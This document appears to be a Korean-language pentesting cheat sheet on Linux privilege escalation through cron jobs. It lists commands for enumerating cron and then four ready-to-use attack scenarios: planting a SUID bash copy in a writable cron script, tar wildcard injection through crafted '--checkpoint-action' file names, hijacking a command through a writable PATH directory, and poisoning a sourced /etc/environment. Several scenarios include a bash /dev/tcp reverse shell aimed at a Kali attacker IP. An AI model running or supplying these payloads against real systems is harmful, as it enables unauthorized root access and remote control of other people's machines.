## cron 확인

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l             # 현재 사용자
crontab -l -u root     # root (권한 필요)
cat /var/spool/cron/crontabs/root 2>/dev/null

# 시스템 전체 cron 검색
grep -r "CRON" /var/log/syslog 2>/dev/null | tail -20
```

## 시나리오 1: 쓰기 가능한 스크립트

```bash
# 스크립트 쓰기 권한 확인
ls -la /opt/backup.sh
stat /opt/backup.sh

# 페이로드 추가
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/backup.sh

# cron 실행 대기 후
/tmp/bash -p    # → root shell

# 또는 직접 리버스쉘
echo 'bash -i >& /dev/tcp/<칼리IP>/4444 0>&1' >> /opt/backup.sh
```

## 시나리오 2: 와일드카드 주입 (tar, rsync)

cron이 `tar -czf backup.tar.gz /var/www/*` 를 실행할 때

```bash
cd /var/www
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
cat > shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
EOF
chmod +x shell.sh

# cron 실행 후
/tmp/bash -p
```

## 시나리오 3: 쓰기 가능한 PATH 디렉터리

cron이 절대경로 없이 명령 실행 시

```bash
# crontab 확인
# * * * * * root cleanup

# PATH에 쓰기 가능한 디렉터리가 있으면
echo '#!/bin/bash
cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/cleanup
chmod +x /usr/local/bin/cleanup

# 또는 /etc/crontab의 PATH 확인
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:...
echo '#!/bin/bash
bash -i >& /dev/tcp/<칼리IP>/4444 0>&1' > /home/user/cleanup
chmod +x /home/user/cleanup
```

## 시나리오 4: 쓰기 가능한 스크립트가 include하는 파일

```bash
# backup.sh 내용: source /etc/environment

ls -la /etc/environment
# → writable이면 페이로드 추가
echo 'bash -i >& /dev/tcp/<칼리IP>/4444 0>&1' >> /etc/environment
```
